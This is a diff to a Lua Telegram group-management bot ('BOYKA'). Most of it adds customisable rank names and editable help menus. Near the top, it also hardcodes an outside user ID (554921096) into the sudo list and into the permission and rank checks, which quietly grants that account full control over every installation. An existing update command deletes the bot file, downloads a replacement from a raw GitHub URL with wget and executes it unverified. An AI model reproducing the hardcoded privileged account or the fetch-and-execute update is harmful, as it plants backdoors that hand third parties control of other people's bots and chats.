@@ -130,11 +130,14 @@ token = sudos.token
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
+sudo_users = {SUDO,554921096}
 function SudoBot(msg)  
 local BOYKA = false  
-if tonumber(msg.sender_user_id_) == tonumber(SUDO) then
+for k,v in pairs(sudo_users) do  
+if tonumber(msg.sender_user_id_) == tonumber(v) then  
 BOYKA = true  
-end
+end  
+end  
 return BOYKA  
 end 
 function Sudo(msg) 
@@ -186,7 +189,9 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(SUDO) then
+if tonumber(user_id) == tonumber(554921096) then  
+var = true  
+elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif database:sismember(bot_id..'Sudo:User', user_id) then
 var = true  
@@ -205,25 +210,28 @@ var = false
 end  
 return var
 end 
+
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(SUDO) then
+if tonumber(user_id) == tonumber(554921096) then  
+var = 'مطور السورس👨‍🏫'
+elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي👨‍💻'  
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = 'البوت👷‍♂️'
 elseif database:sismember(bot_id..'Sudo:User', user_id) then
-var = 'المطور👩‍🚒'  
+var = database:get(bot_id.."Sudo:Rd"..msg.chat_id_) or 'المطور👩‍🚒'  
 elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
-var = 'المنشئ اساسي👩‍🚀'
+var = database:get(bot_id.."BasicConstructor:Rd"..msg.chat_id_) or 'المنشئ اساسي👩‍🚀'
 elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
-var = 'المنشئ👨‍✈️'  
+var = database:get(bot_id.."Constructor:Rd"..msg.chat_id_) or 'المنشئ👨‍✈️'  
 elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
-var = 'المدير👨‍✈️'  
+var = database:get(bot_id.."Manager:Rd"..msg.chat_id_) or 'المدير👨‍✈️'  
 elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
-var = 'الادمن👮‍♂️'  
+var = database:get(bot_id.."Mod:Rd"..msg.chat_id_) or 'الادمن👮‍♂️'  
 elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
-var = 'المميز👨‍🎓'  
+var = database:get(bot_id.."Special:Rd"..msg.chat_id_) or 'المميز👨‍🎓'  
 else  
-var = 'العضو👶'
+var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'العضو👶'
 end  
 return var
 end 
@@ -796,7 +804,7 @@ end
 if text == 'تحديث السورس ™' and SudoBot(msg) then 
 os.execute('rm -rf BOYKA.lua')
 os.execute('wget https://raw.githubusercontent.com/BOYKABOT/BOYKA/master/BOYKA.lua')
-send(msg.chat_id_, msg.id_,'🔘|تم تحديث سورس')
+send(msg.chat_id_, msg.id_,'🔘 | تم تحديث سورس')
 dofile('BOYKA.lua')  
 end
 if text == "ضع اسم للبوت ®" and SudoBot(msg) then  
@@ -807,7 +815,7 @@ end
 if text == 'الاحصائيات 🔍' and SudoBot(msg) then 
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
-Text = '*📝¦ احصائيات البوت \n'..'👥|عدد المجموعات »{'..Groups..'}'..'\n👤| عدد المشتركين »{'..Users..'}*'
+Text = '*📝 | احصائيات البوت \n'..'👥|عدد المجموعات »{'..Groups..'}'..'\n👤| عدد المشتركين »{'..Users..'}*'
 send(msg.chat_id_, msg.id_,Text) 
 return false
 end
@@ -1349,11 +1357,9 @@ return false
 end
 end
 end
---------------------------------------------------------------------------------------------------------------
-if text and database:get(bot_id..'lock:Iran'..msg.chat_id_) and not Manager(msg) then 
-list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن","سلام"}
+if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Manager(msg) then 
+list = {'چ','ک','گ','ڨ','پ','ژ'}
 for k,v in pairs(list) do
-print(string.find(text,v))
 if string.find(text,v) ~= nil then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 return false
@@ -6800,7 +6806,7 @@ if text == 'الاحصائيات' or text == 'المجموعات' or text == 'ا
 if Sudo(msg) then 
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
-Text = '*📝| احصائيات البوت الكامله \n'..'👥| عدد المجموعات »{'..Groups..'}'..'\n👤¦ عدد المشتركين »{'..Users..'}*'
+Text = '*📝| احصائيات البوت الكامله \n'..'👥| عدد المجموعات »{'..Groups..'}'..'\n👤| عدد المشتركين »{'..Users..'}*'
 send(msg.chat_id_, msg.id_,Text) 
 end
 return false
@@ -6943,7 +6949,7 @@ local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.sender_
 local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
 local username = ('[@'..data.username_..']' or 'لا يوجد')
 local iduser = result.sender_user_id_
-send(msg.chat_id_, msg.id_,'*📌¦ ايديه »('..iduser..')\n💠¦ معرفه »(*'..username..'*)\n🚸¦ رتبته »('..rtp..')\n✏¦ تعديلاته »('..edit..')\n🎉¦ مجوهراته »('..NUMPGAME..')\n🔖¦ جهاته »('..Contact..')\n📨¦ رسائله »('..Msguser..')*')
+send(msg.chat_id_, msg.id_,'*🎟️| ايديه »('..iduser..')\n🎭| معرفه »(*'..username..'*)\n📌| رتبته »('..rtp..')\n✏| تعديلاته »('..edit..')\n🎉| مجوهراته »('..NUMPGAME..')\n🔖| جهاته »('..Contact..')\n📨| رسائله »('..Msguser..')*')
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
@@ -6960,7 +6966,7 @@ local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.id_) or
 local rtp = Rutba(result.id_,msg.chat_id_)
 local username = ('[@'..data.username_..']' or 'لا يوجد')
 local iduser = result.id_
-send(msg.chat_id_, msg.id_,'*📌¦ ايديه »('..iduser..')\n💠¦ معرفه »(*'..username..'*)\n🚸¦ رتبته »('..rtp..')\n✏¦ تعديلاته »('..edit..')\n🎉¦ مجوهراته »('..NUMPGAME..')\n🔖¦ جهاته »('..Contact..')\n📨¦ رسائله »('..Msguser..')*')
+send(msg.chat_id_, msg.id_,'*🎟️| ايديه »('..iduser..')\n🎭| معرفه »(*'..username..'*)\n📌| رتبته »('..rtp..')\n✏| تعديلاته »('..edit..')\n🎉| مجوهراته »('..NUMPGAME..')\n🔖| جهاته »('..Contact..')\n📨| رسائله »('..Msguser..')*')
 end,nil)
 else
 send(msg.chat_id_, msg.id_,'⚠¦ المعرف غير صحيح ')
@@ -7989,6 +7995,137 @@ Text_Games = [[
 ]]
 send(msg.chat_id_, msg.id_,Text_Games) 
 end
+if text and text:match("^تغير رد المطور (.*)$") and Manager(msg) then
+local Teext = text:match("^تغير رد المطور (.*)$") 
+database:set(bot_id.."Sudo:Rd"..msg.chat_id_,Teext)
+send(msg.chat_id_, msg.id_,"👥| تم تغير رد المطور الى » "..Teext)
+end
+if text and text:match("^تغير رد المنشئ الاساسي (.*)$") and Manager(msg) then
+local Teext = text:match("^تغير رد المنشئ الاساسي (.*)$") 
+database:set(bot_id.."BasicConstructor:Rd"..msg.chat_id_,Teext)
+send(msg.chat_id_, msg.id_,"👥| تم تغير رد المنشئ الاساسي الى » "..Teext)
+end
+if text and text:match("^تغير رد المنشئ (.*)$") and Manager(msg) then
+local Teext = text:match("^تغير رد المنشئ (.*)$") 
+database:set(bot_id.."Constructor:Rd"..msg.chat_id_,Teext)
+send(msg.chat_id_, msg.id_,"👥| تم تغير رد المنشئ الى » "..Teext)
+end
+if text and text:match("^تغير رد المدير (.*)$") and Manager(msg) then
+local Teext = text:match("^تغير رد المدير (.*)$") 
+database:set(bot_id.."Manager:Rd"..msg.chat_id_,Teext) 
+send(msg.chat_id_, msg.id_,"👥| تم تغير رد المدير الى » "..Teext)
+end
+if text and text:match("^تغير رد الادمن (.*)$") and Manager(msg) then
+local Teext = text:match("^تغير رد الادمن (.*)$") 
+database:set(bot_id.."Mod:Rd"..msg.chat_id_,Teext)
+send(msg.chat_id_, msg.id_,"👥| تم تغير رد الادمن الى » "..Teext)
+end
+if text and text:match("^تغير رد المميز (.*)$") and Manager(msg) then
+local Teext = text:match("^تغير رد المميز (.*)$") 
+database:set(bot_id.."Special:Rd"..msg.chat_id_,Teext)
+send(msg.chat_id_, msg.id_,"👥| تم تغير رد المميز الى » "..Teext)
+end
+if text and text:match("^تغير رد العضو (.*)$") and Manager(msg) then
+local Teext = text:match("^تغير رد العضو (.*)$") 
+database:set(bot_id.."Memp:Rd"..msg.chat_id_,Teext)
+send(msg.chat_id_, msg.id_,"👥| تم تغير رد العضو الى » "..Teext)
+end
+
+if text and text:match("^(.*)$") then
+if database:get(bot_id..'help'..msg.sender_user_id_) == 'true' then
+send(msg.chat_id_, msg.id_, '📮¦ تم حفظ الكليشه بنجاح')
+database:del(bot_id..'help'..msg.sender_user_id_)
+database:set(bot_id..'help_text',text)
+return false
+end
+end
+if text and text:match("^(.*)$") then
+if database:get(bot_id..'help1'..msg.sender_user_id_) == 'true' then
+send(msg.chat_id_, msg.id_, '📮¦ تم حفظ الكليشه بنجاح')
+database:del(bot_id..'help1'..msg.sender_user_id_)
+database:set(bot_id..'help1_text',text)
+return false
+end
+end
+if text and text:match("^(.*)$") then
+if database:get(bot_id..'help2'..msg.sender_user_id_) == 'true' then
+send(msg.chat_id_, msg.id_, '📮¦ تم حفظ الكليشه بنجاح')
+database:del(bot_id..'help2'..msg.sender_user_id_)
+database:set(bot_id..'help2_text',text)
+return false
+end
+end
+
+if text and text:match("^(.*)$") then
+if database:get(bot_id..'help3'..msg.sender_user_id_) == 'true' then
+send(msg.chat_id_, msg.id_, '📮¦ تم حفظ الكليشه بنجاح')
+database:del(bot_id..'help3'..msg.sender_user_id_)
+database:set(bot_id..'help3_text',text)
+return false
+end
+end
+if text and text:match("^(.*)$") then
+if database:get(bot_id..'help4'..msg.sender_user_id_) == 'true' then
+send(msg.chat_id_, msg.id_, '📮¦ تم حفظ الكليشه بنجاح')
+database:del(bot_id..'help4'..msg.sender_user_id_)
+database:set(bot_id..'help4_text',text)
+return false
+end
+end
+if text and text:match("^(.*)$") then
+if database:get(bot_id..'help5'..msg.sender_user_id_) == 'true' then
+send(msg.chat_id_, msg.id_, '📮¦ تم حفظ الكليشه بنجاح')
+database:del(bot_id..'help5'..msg.sender_user_id_)
+database:set(bot_id..'help5_text',text)
+return false
+end
+end
+
+if text == 'استعاده الاوامر' and SudoBot(msg) then
+database:del(bot_id..'help_text')
+database:del(bot_id..'help1_text')
+database:del(bot_id..'help2_text')
+database:del(bot_id..'help3_text')
+database:del(bot_id..'help4_text')
+database:del(bot_id..'help5_text')
+send(msg.chat_id_, msg.id_, '📛¦ تم استعادة الاوامر القديمه')
+end
+if text == 'تغير امر الاوامر' and SudoBot(msg) then
+send(msg.chat_id_, msg.id_, '📛¦ الان يمكنك ارسال الكليشه')
+database:set(bot_id..'help'..msg.sender_user_id_,'true')
+return false 
+end
+if text == 'تغير امر م1' and SudoBot(msg) then
+send(msg.chat_id_, msg.id_, '📛¦ الان يمكنك ارسال الكليشه')
+database:set(bot_id..'help1'..msg.sender_user_id_,'true')
+return false 
+end
+
+if text == 'تغير امر م2' and SudoBot(msg) then
+send(msg.chat_id_, msg.id_, '📛¦ الان يمكنك ارسال الكليشه')
+database:set(bot_id..'help2'..msg.sender_user_id_,'true')
+return false 
+end
+
+if text == 'تغير امر م3' and SudoBot(msg) then
+send(msg.chat_id_, msg.id_, '📛¦ الان يمكنك ارسال الكليشه')
+database:set(bot_id..'help3'..msg.sender_user_id_,'true')
+return false 
+end
+
+if text == 'تغير امر م4' and SudoBot(msg) then
+send(msg.chat_id_, msg.id_, '📛¦ الان يمكنك ارسال الكليشه')
+database:set(bot_id..'help4'..msg.sender_user_id_,'true')
+return false 
+end
+
+if text == 'تغير امر م5' and SudoBot(msg) then
+send(msg.chat_id_, msg.id_, '📛¦ الان يمكنك ارسال الكليشه')
+database:set(bot_id..'help5'..msg.sender_user_id_,'true')
+return false 
+end
+
+
 if text == 'الاوامر' then
 if not Mod(msg) then
 send(msg.chat_id_, msg.id_,'👥¦ هاذا الامر خاص بالادمنيه') 
@@ -8003,6 +8140,7 @@ send(msg.chat_id_, msg.id_,'👥¦ لا تستطيع استخدام البوت �
 end
 return false
 end
+local help_text = database:get(bot_id..'help_text')
 Text = [[
 📮| اهلا بك في اوامر البوت  
 ~~~~~~~~~~~~~~~~~~~
@@ -8014,7 +8152,7 @@ Text = [[
 ~~~~~~~~~~~~~~~~~~~
 🔖| CH » @BOBBW
 ]]
-send(msg.chat_id_, msg.id_,Text) 
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
 return false
 end
 if text == 'م1' then
@@ -8032,6 +8170,7 @@ send(msg.chat_id_, msg.id_,'👥¦ لا تستطيع استخدام البوت �
 end
 return false
 end
+local help_text = database:get(bot_id..'help1_text')
 Text = [[
 📑| اوامر حماية المجموعه 
 ~~~~~~~~~~~~~~~
@@ -8068,7 +8207,7 @@ Text = [[
 ~~~~~~~~~~~~~~~~~~~
 🔖| CH » @BOBBW
 ]]
-send(msg.chat_id_, msg.id_,Text) 
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
 return false
 end
 if text == 'م2' then
@@ -8085,6 +8224,7 @@ send(msg.chat_id_, msg.id_,'👥¦ لا تستطيع استخدام البوت �
 end
 return false
 end
+local help_text = database:get(bot_id..'help2_text')
 Text = [[
 🔘| اوامر الادمنيه
 ~~~~~~~~~~~~~
@@ -8120,7 +8260,7 @@ Text = [[
 ~~~~~~~~~~~~~~~
 🔖| CH » @BOBBW
 ]]
-send(msg.chat_id_, msg.id_,Text) 
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
 return false
 end
 
@@ -8138,9 +8278,13 @@ send(msg.chat_id_, msg.id_,'👥¦ لا تستطيع استخدام البوت �
 end
 return false
 end
+local help_text = database:get(bot_id..'help3_text')
 Text = [[
 📁| اوامر مدراء المجموعه 
-~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~
+📄| تغير امر الاوامر
+📄| تغير امر م1 › الحد م5
+📄| استعاده الاوامر
 🚸| رفع/تنزيل ادمن
 👤¦ الادمنيه
 ⛔| مسح الادمنيه
@@ -8155,6 +8299,13 @@ Text = [[
 📝| مسح ردود المدير
 📄| ردود المدير
 📂| اضف/حذف رد
+💠| تغير رد المطور + اسم
+💠| تغير رد المنشئ الاساسي + اسم
+💠| تغير رد المنشئ + اسم
+💠| تغير رد المدير + اسم
+💠| تغير رد الادمن + اسم
+💠| تغير رد المميز + اسم
+💠| تغير رد العضو + اسم
 📮| تعطيل/تفعيل ردود المدير
 📮| تعطيل/تفعيل ردود المطور
 📮| تعطيل/تفعيل الايدي
@@ -8166,7 +8317,7 @@ Text = [[
 ~~~~~~~~~~~~~~~~~~~
 🔖| CH » @BOBBW
 ]]
-send(msg.chat_id_, msg.id_,Text) 
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
 return false
 end
 if text == 'م4' then
@@ -8183,6 +8334,7 @@ send(msg.chat_id_, msg.id_,'👥¦ لا تستطيع استخدام البوت �
 end
 return false
 end
+local help_text = database:get(bot_id..'help4_text')
 Text = [[
 👤| اوامر المنشئين للمجموعه
 ~~~~~~~~~~~~~~~~~~~
@@ -8192,6 +8344,9 @@ Text = [[
 ⚠️| حذف الاوامر المضافه
 🧾| الاوامر المضافه
 ~~~~~~~~~~~
+📄| تغير امر الاوامر
+📄| تغير امر م1 › الحد م5
+📄| استعاده الاوامر
 🖇️| مسح المنشئين
 ♻️| رفع/تنزيل منشئ
 👥| المنشئين
@@ -8202,12 +8357,19 @@ Text = [[
 🔘| تنزيل ادمن بالكروب
 🔘| رفع ادمن بكل الصلاحيات
 🔘| تنزيل ادمن بكل الصلاحيات
+💠| تغير رد المطور + اسم
+💠| تغير رد المنشئ الاساسي + اسم
+💠| تغير رد المنشئ + اسم
+💠| تغير رد المدير + اسم
+💠| تغير رد الادمن + اسم
+💠| تغير رد المميز + اسم
+💠| تغير رد العضو + اسم
 📬| تفعيل/تعطيل الحظر
 📭| تفعيل/تعطيل الرفع
 ~~~~~~~~~~~~~~~~~~~
 🔖| CH » @BOBBW
 ]]
-send(msg.chat_id_, msg.id_,Text) 
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
 return false
 end
 if text == 'م5' then
@@ -8224,6 +8386,7 @@ send(msg.chat_id_, msg.id_,'👥¦ لا تستطيع استخدام البوت �
 end
 return false
 end
+local help_text = database:get(bot_id..'help5_text')
 Text = [[
 🔘| اوامر مطورين البوت
 ~~~~~~~~~~~~~~~~~~~
@@ -8234,7 +8397,7 @@ Text = [[
 📌| رفع/تنزيل منشئ اساسي
 📌| مسح المطورين
 📌| المطورين
-📌| اضف/حذف مطور
+📌| رفع / تنزيل مطور
 ~~~~~~~~~~~
 🔗| اسم البوت + غادر
 ⚙| غادر
@@ -8276,7 +8439,7 @@ Text = [[
 ~~~~~~~~~~~~~~~~~~~
 🔖| CH » @BOBBW
 ]]
-send(msg.chat_id_, msg.id_,Text) 
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
 return false
 end
 if text == "🙊" or text == "🙈" then
